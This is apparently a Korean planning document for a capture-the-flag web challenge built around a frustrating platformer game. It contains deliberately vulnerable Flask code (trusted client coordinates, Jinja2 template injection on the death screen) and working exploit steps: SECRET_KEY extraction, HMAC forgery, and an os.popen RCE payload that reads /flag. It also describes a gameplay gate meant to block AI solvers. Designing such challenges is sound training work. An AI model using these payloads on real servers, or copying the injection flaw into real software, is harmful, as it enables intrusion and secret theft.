# CTF 문제 기획 정리: 고양이 마리오 웹 챌린지

## 📌 최종 컨셉 요약

**고양이 마리오 / 시보냥 스타일의 킹받는 웹 플랫포머 CTF**

- 피지컬 풀이: 1시간 빡치면서 클리어 가능
- 의도된 풀이: 웹 취약점 익스플로잇으로 즉시 골 도달
- 플래그: 골 좌표 도달 시 서버에서 발급

---

## 🎮 게임 디자인

### 컨셉
- HTML5 Canvas 기반 횡스크롤 플랫포머
- 시보냥/고양이마리오 스타일 트랩 다수
- 골 지점 도달 = 플래그

### 요소 (피지컬 풀이 방해)
- 안전해보이는 발판이 누르면 사라짐
- 보이지 않는 천장 가시
- 가짜 골 (도달하면 죽음)
- 점프하면 위에서 운석 떨어짐
- 깃발 잡으려고 다가가면 깃발이 도망감
- 같은 점프 위치인데 가끔 안 닿음

피지컬 풀이를 의도적으로 짜증나게 → 자연스럽게 "API 까보자"로 유도

---

## 🐛 핵심 취약점 1: 클라이언트 좌표 신뢰

### 메인 버그: 서버가 클라이언트 좌표를 신뢰

```python
@app.post("/api/move")
def move():
    s = session.get("game", {"x": 0, "y": 0})
    s["x"] = request.json["x"]   # ← 검증 없음
    s["y"] = request.json["y"]
    session["game"] = s
    
    if s["x"] >= GOAL_X and s["y"] == GOAL_Y:
        return {"flag": FLAG}
    return {"ok": True}
```

### 익스플로잇

```javascript
fetch('/api/move', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({x: 9999, y: 200})
}).then(r => r.json()).then(console.log)
// → {flag: "FLAG{...}"}
```

### 난이도 한 단계 올리기 (HMAC 서명 검증)

```python
@app.post("/api/move")
def move():
    s = session["game"]
    new_x, new_y = request.json["x"], request.json["y"]
    
    # HMAC 서명 검증
    sig = request.headers.get("X-Signature")
    expected = hmac.new(
        app.config["SECRET_KEY"].encode(),
        f"{new_x}".encode(),
        hashlib.sha256
    ).hexdigest()
    
    if sig != expected: return {"error": "invalid sig"}
    if abs(new_x - s["x"]) > 50: return {"error": "too fast"}
    
    s["x"], s["y"] = new_x, new_y
    if s["x"] >= GOAL_X: return {"flag": FLAG}
```

검증 강화로 단순 좌표 변조 차단 → 다음 취약점(SSTI)으로 우회 유도

---

## 🐛 핵심 취약점 2: SSTI (Server-Side Template Injection)

### 가장 자연스러운 위치: 사망 화면

이 게임은 **죽는 게 일상**이라 사망 화면에 SSTI 심으면 컨셉이랑 완벽하게 맞음.

```python
@app.post("/api/start")
def start():
    name = request.json.get("name", "Player")
    session["name"] = name  # ← 사용자 입력 저장
    session["game"] = {"x": 0, "y": 0, "deaths": 0}
    return {"ok": True}

@app.get("/api/death-screen")
def death_screen():
    name = session.get("name", "Player")
    deaths = session["game"]["deaths"]
    # 취약: 사용자 입력을 템플릿 문자열에 직접 삽입
    template = f"<h1>{name} died {deaths} times. Loser.</h1>"
    return render_template_string(template)
```

### 익스플로잇 흐름

**1단계 — SECRET_KEY 추출**
```javascript
// 닉네임에 SSTI 페이로드 넣고 시작
fetch('/api/start', {
    method: 'POST',
    body: JSON.stringify({name: "{{config.SECRET_KEY}}"}),
    headers: {'Content-Type': 'application/json'}
})

// 일부러 죽고 사망 화면 확인
// → "abc123secret died 1 times. Loser." 식으로 SECRET_KEY 노출
```

**2단계 — 추출한 키로 HMAC 서명 위조 → 골 좌표 전송**
```python
import hmac, hashlib, requests

SECRET = "추출한_시크릿_키"
target_x = 9999

sig = hmac.new(SECRET.encode(), f"{target_x}".encode(), hashlib.sha256).hexdigest()

r = requests.post("http://target/api/move",
    json={"x": target_x, "y": 200},
    headers={"X-Signature": sig},
    cookies={"session": "..."}
)
print(r.json())  # → {"flag": "FLAG{...}"}
```

### 더 강력한 SSTI 페이로드 (RCE)

```python
# 모든 Python 클래스 노출
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 서버에서 /flag 파일 읽기 (RCE)
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
```

이러면 좌표 조작 없이 **SSTI만으로도 플래그 직접 획득 가능**한 풀이도 생김.

---

## 🛡️ AI 풀이 차단: 실제 게임 플레이 검증

AI는 코드 보면 즉시 풀이 페이로드 뱉음. 이걸 막으려면 **실제로 플레이한 흔적이 있어야만 취약점 트리거되도록** 게이트 추가.

### 세션 구조 확장

```python
session["game"] = {
    "x": 0, "y": 0,
    "deaths": 0,
    "move_count": 0,
    "jump_count": 0,
    "move_timestamps": [],     # 이동 시각 기록
    "trap_hits": [],           # 함정 종류별 충돌 기록
    "session_start": time.time(),
    "last_move": time.time(),
}
```

### 게임 플레이 검증 함수

```python
import time, statistics

def validate_real_play(session):
    g = session.get("game", {})
    
    # 1) 최소 플레이 시간 (10초 이상)
    if time.time() - g["session_start"] < 30:
        return False, "play_time_insufficient"
    
    # 2) 최소 사망 횟수 (3회 이상, 함정 다양하게)
    if g["deaths"] < 3:
        return False, "deaths_required"
    
    # 3) 트랩 다양성 (최소 2종류 이상 죽어봐야 함)
    unique_traps = set(g["trap_hits"])
    if len(unique_traps) < 2:
        return False, "trap_variety_required"
    
    # 4) 이동 횟수 (실제 조작 흔적)
    if g["move_count"] < 20:
        return False, "movement_required"
    
    # 5) 이동 간격 분석 (봇 탐지)
    ts = g["move_timestamps"]
    if len(ts) >= 10:
        intervals = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
        avg = statistics.mean(intervals)
        stdev = statistics.stdev(intervals) if len(intervals) > 1 else 0
        
        # 너무 빠른 이동 = 봇
        if avg < 0.05:
            return False, "too_fast_bot_detected"
        
        # 너무 균일한 간격 = 봇 (인간은 자연스러운 편차)
        if stdev < 0.01:
            return False, "too_uniform_bot_detected"
    
    return True, "ok"
```

### 엔드포인트에 게이트 적용

```python
@app.post("/api/move")
def move():
    g = session["game"]
    now = time.time()
    
    # 이동 기록 누적
    g["move_count"] += 1
    g["move_timestamps"].append(now)
    g["move_timestamps"] = g["move_timestamps"][-100:]  # 최근 100개만
    g["last_move"] = now
    
    # ... HMAC 검증, 좌표 업데이트 ...

@app.post("/api/death")
def death():
    g = session["game"]
    trap_type = request.json.get("trap")  # 어떤 함정에 죽었는지
    
    # 함정 타입 화이트리스트 (조작 방지)
    valid_traps = ["spike", "fake_platform", "meteor", "false_goal"]
    if trap_type not in valid_traps:
        return {"error": "invalid trap"}
    
    g["deaths"] += 1
    g["trap_hits"].append(trap_type)
    g["x"], g["y"] = 0, 0
    return {"ok": True}

@app.get("/api/death-screen")
def death_screen():
    # ★ SSTI 트리거 게이트
    valid, reason = validate_real_play(session)
    if not valid:
        return jsonify({
            "error": "no genuine gameplay detected",
            "hint": reason
        }), 403
    
    # 검증 통과해야만 SSTI 발현
    name = session.get("name", "Player")
    deaths = session["game"]["deaths"]
    template = f"<h1>{name} died {deaths} times. Loser.</h1>"
    return render_template_string(template)
```

### 풀이자가 우회하려면

AI한테 코드만 보여주면:
- "이 검증을 통과하려면 실제로 30초 이상 플레이하고 3번 이상 죽어야 합니다"
- "Selenium/Playwright로 자동화 스크립트를 짜서..."

여기서 AI는 멈춤. **인간이 직접 게임을 3분 조작해야 진행 가능**.

### 봇 우회 방어 디테일

```python
# 사망 패킷 자체도 검증
@app.post("/api/death")
def death():
    g = session["game"]
    
    # 직전에 실제 이동이 있었는지
    if time.time() - g["last_move"] > 5:
        return {"error": "no recent activity"}
    
    # 죽은 좌표가 함정 위치랑 일치하는지
    trap_type = request.json["trap"]
    if not is_at_trap(g["x"], g["y"], trap_type):
        return {"error": "not at trap location"}
    
    # ...
```

### 검증 단계별 효과

| 검증 항목 | 우회 난이도 | AI 차단 효과 |
|-----------|-------------|--------------|
| 플레이 시간 30초 | 쉬움 (sleep) | 약함 |
| 사망 횟수 3회 | 중간 (좌표+사망 패킷 위조 필요) | 중간 |
| 트랩 다양성 | 중간 (위치 알아야 함) | 중간 |
| 이동 횟수 50회 | 쉬움 (반복 호출) | 약함 |
| 이동 간격 편차 | 어려움 (인간 패턴 흉내) | 강함 |
| 사망 좌표-함정 일치 | 어려움 (함정 좌표 알아야) | 강함 |

조합하면 AI한테 "걍 직접 게임 하세요" 답변 유도됨.

### 트레이드오프

- 진짜 풀이자도 3분은 게임 해야 함 (CTF 시간 제한 고려)
- 검증 너무 빡세면 정상 플레이어도 못 풂
- 검증값 (10초, 3회 등)은 **테스트하면서 튜닝** 필요

---

## 🎯 다층 풀이 경로

| B. SSTI → SECRET_KEY → HMAC 위조 → 좌표 조작 | ⭐⭐⭐ | 의도된 풀이 |

---

## 🔄 문제 플로우

### 참가자 시점

```
1. CTF 문제 URL 접속
   └─ "고양이 마리오? 웹 문제인데 게임?" (의심 시작)

2. 플레이 시도
   └─ 첫 발판 디딤 → 사라짐 → 죽음
   └─ 5분쯤 빡침 게이지 충전

3. "이거 피지컬로 풀라는 건 아니겠지" → F12

4. Network 탭 관찰
   └─ 캐릭터 움직일 때마다 POST /api/move
   └─ Payload: {"x": 120, "y": 400}, 헤더에 X-Signature

5. 좌표만 변조 시도 → 서명 검증 실패

6. 사망 화면 직접 호출 시도 → 403 "no gameplay detected"
   └─ 코드 분석: 30초 플레이 + 3번 사망 + 2종 트랩 필요

7. 어쩔 수 없이 5분 정도 진짜 플레이
   └─ 다양한 함정에 죽으며 검증 카운터 채움

8. 검증 통과 후 사망 화면에서 닉네임이 그대로 렌더링됨 발견
   └─ {{7*7}} 입력 → 49 출력 → SSTI 확인

9. {{config.SECRET_KEY}} 페이로드로 키 추출

10. HMAC 서명 위조 → 골 좌표 전송 → 플래그
    (또는 SSTI RCE로 /flag 직접 read)

11. 플래그 제출 → 클리어
```

### 서버 시점

```
[접속]
  GET /
  └─ 세션 쿠키 발급, 게임 페이지 반환

[게임 시작]
  POST /api/start {name}
  └─ 닉네임 + 게임 상태 세션 저장 (취약점 2 진입점)

[매 이동]
  POST /api/move {x, y} + X-Signature
  ├─ HMAC 서명 검증 (취약점 1 방어)
  ├─ 거리 체크
  ├─ 좌표 업데이트
  ├─ 골 도달 체크: x >= GOAL_X ?
  │   └─ 도달 → {"flag": "FLAG{...}"}
  └─ 일반 → {"ok": true}

[죽음]
  POST /api/death → 좌표 초기화, deaths++
  GET /api/death-screen → 닉네임 템플릿 렌더링 (취약점 2 트리거)
```

### 트리거 이벤트 정리

| 이벤트 | 서버 동작 | 결과 |
|--------|-----------|------|
| 페이지 접속 | 세션 생성 | 게임 로드 |
| 게임 시작 (닉네임 입력) | 세션에 닉네임 저장 | SSTI 진입점 |
| WASD 이동 | move API 호출 (서명 + 타임스탬프 기록) | 좌표 업데이트 |
| 함정 충돌 | death API 호출 (트랩 종류 + 위치 검증) | deaths++, 트랩 기록 |
| 사망 화면 요청 | **플레이 검증 실행** | 통과 시 SSTI 발현 |
| 검증 실패 | 403 응답 | 풀이 진행 차단 |
| 골 좌표 도달 | flag 반환 | 클리어 |
| 비정상 이동/서명 | 거부 응답 | 차단 |
| 봇 패턴 감지 | 세션 플래그 | SSTI 영구 차단 |

---

## 💡 힌트 / 단서 배치

자연스럽게 풀이로 유도하는 장치:

- `/api/debug` 같은 엔드포인트 (404 페이지에 슬쩍 노출)
- robots.txt에 `/api/` 디스얼로우 → 오히려 존재 알려줌
- 화면에 좌표 표시 (`x: 120 / 9000`) → 골 좌표 힌트
- 사망 횟수 카운터 (킹받음 강조용)
- 닉네임 입력 안내 문구 (`Welcome, {name}!` 같은 사망 화면 미리보기)

---

## 🛠 기술 스택

```
Frontend:  Phaser.js + Vanilla JS
Backend:   Flask (Python) + flask-session + Jinja2
Storage:   메모리 dict 또는 Redis
배포:      Docker + gunicorn + nginx
```

### 스택 선정 이유

**Phaser.js (프론트)**
- Canvas 게임 엔진, 시보냥 클론 만들기 적합
- 트랩, 충돌, 애니메이션 처리 쉬움

**Flask (백엔드)**
- 코드 양 적어서 빠른 완성
- CTF 문서/예제 풍부
- 디버깅 쉬움
- **Jinja2 SSTI 카테고리가 자연스럽게 녹아듦**
- 처음 만드는 CTF 문제로 적합

---

## 🚀 운영 시 체크리스트

- 세션별 격리 (각 참가자 독립적인 게임 상태)
- 로그 수집 (누가 어떻게 풀었는지 추적)
- Docker로 격리된 환경 배포
- `/flag` 파일 권한 설정 (RCE 풀이 가능하게 read는 허용)
- SSTI 페이로드 길이 제한 (너무 짧게 자르면 풀이 불가)

---

## 📋 다음 단계

1. Flask 백엔드 골격 작성
   - 세션 관리
   - `/api/start`, `/api/move`, `/api/death`, `/api/death-screen` 엔드포인트
   - HMAC 서명 검증 로직
   - SSTI 의도적 노출 (render_template_string)
   - 플래그 발급 로직
2. Phaser.js 프론트엔드 작성
   - 기본 플랫포머 메커닉
   - 닉네임 입력 화면
   - 킹받음 트랩 구현
   - API 연동 (서명 포함)
3. 트랩 디자인 (레벨 디자인)
4. Docker 컨테이너화
5. 배포 / 테스트

---

## 📝 메모

- 플래그 형식: `FLAG{...}` 또는 대회 표준 형식 사용
- 의도된 풀이 시간: 15~40분 (실제 플레이 + SSTI 분석 시간 포함)
- 피지컬 풀이 시간: 약 1시간 (의도적으로 빡치게)
- 난이도 등급: 중급 (웹 카테고리, 다층 풀이)
- 풀이 카테고리 태그: `web`, `ssti`, `crypto-hmac`, `anti-bot`
- AI 풀이 차단 수준: 코드만 보여주는 1샷 풀이 불가능, 실제 게임 플레이 강제
